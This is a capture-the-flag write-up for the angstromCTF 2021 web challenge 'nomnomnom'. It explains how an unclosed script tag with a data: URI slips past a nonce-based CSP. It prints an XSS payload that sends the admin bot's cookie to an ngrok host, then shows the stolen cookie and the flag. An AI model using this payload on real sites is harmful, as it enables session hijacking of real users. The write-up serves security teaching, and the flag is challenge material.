---
layout: post
title:  "nomnomnom - Web"
date:   2021-04-08 12:28:05 +0100
categories: writeups
---

```
Challenge: nomnomnom
Author: Shotokhan
Description: XSS with misconfigured CSP and page source
CTF: angstromCTF 2021
Category: Web
```

# Writeup
This Node.JS application comes with an interface with a game like the old video-game snake. Source code is provided.
After playing, you create a "share" with a POST request to /record, in which you send the share name and a score.
These parameters are "sanitized":
- name's maximum length is equal to 100;
- score must be a number greather than 1.
If everything goes well, you are redirected to /share/:shareName, where shareName is the hex representation of an 8-bytes UUID.
The resulting page is built like that:

```
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		${extra}${extra ? '<br /><br />' : ''}
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of ${score}! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by ${name}
		<script nonce='${nonce}'>
            function report() {
                fetch('/report/${req.params.shareName}', {
                    method: 'POST'
                });
            }
            
            document.getElementById('reporter').onclick = () => { report() };
         </script> 
		
	</body>
</html>
``` 

You may have noticed the following variables: nonce, extra, score, name.
- "Score" and "name" were provided with the POST request to /record.
- "Nonce" is hex-16-bytes-UUID, for the CSP.
- "Extra" contains the flag if you made the request with admin's cookie.
This cookie is used by a "visiter" when you call /report/:shareName with a POST request, in fact that endpoint calls visit function.

``` 
app.post('/report/:shareName', async function(req, res) {
	if (!(req.params.shareName in shares)) {
		return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
	}

	await visiter.visit(
		nothisisntthechallenge,
		`http://localhost:9999/shares/${req.params.shareName}`
	);
})
```

Visiter code:

```
async function visit(secret, url) {
	const browser = await puppeteer.launch({ args: ['--no-sandbox'], product: 'firefox' })
	var page = await browser.newPage()
	await page.setCookie({
		name: 'no_this_is_not_the_challenge_go_away',
		value: secret,
		domain: 'localhost',
		samesite: 'strict'
	})
	await page.goto(url)

	// idk, race conditions!!! :D
	await new Promise(resolve => setTimeout(resolve, 500));
	await page.close()
	await browser.close()
}
```

It's clear that our goal is to exploit an XSS vulnerability in order to get admin's cookie, and then to use that cookie to get the flag.
Let's try to do it using "name" parameter.
Well, with a CSP checker we can see that the policy specified is incomplete, and a script can be injected using the object tag, or maybe using a style tag.
We tried many things, testing them locally first, but browser's security mechanisms blocked us:
- an XSS payload injected in an object tag is in a sandbox, i.e. it can't access data outside the object (for example with window.parent.document we got errors regarding Same Origin Policy);
- we can force the admin to make arbitrary requests using XSS, but we need a CORS proxy to do that; it's important to note that cookie's domain is "localhost" and it has a "strict" same-site policy, so it will not be sent unless the request is made to localhost, and obviously you can't use a CORS proxy to make a request to localhost, and you can't make the request without the CORS proxy because it would have been blocked;
- we can try to inject code with the style tag (using background:url("...")) but the MIME type of the returned data is text/html, so not as expected, and it's blocked by another mechanism: CORB.
 
At last, we realized that in the resulting page there was no HTML between our user-provided name and the script tag with the nonce, so we tried with this payload:

```
<script src="data:, alert(1);"
```

Without closing script tag, as you can see. In the resulting page:

```
<script src="data:, alert(1);"
<script nonce='${nonce}'>
```

And in fact it gets executed; notice that this vulnerability is not about a misconfiguration of the CSP, but it is about the poor structure of the HTML doc.
At this point, we can inject an inline script, with an upper bound of 100 characters.
The idea is to send the cookie to webhook, but webhook.site's URL is too long, so we'll set-up ngrok and use the following payload:

```
<script src="data:, location.replace('http://[redacted: 12 chars].ngrok.io/?d=' + document.cookie);"
```

We finally got the cookie:

```
no_this_is_not_the_challenge_go_away=2e04632b78960b03a01fbfbfdbbcf058dd9a64623ac6071c92f047ded9f06519320aed058149352636609e8d6c7faa4eabc88b320321d7f8dcc4c65f87c6690c
```

And this is the flag:
actf{w0ah_the_t4g_n0mm3d_th1ng5}
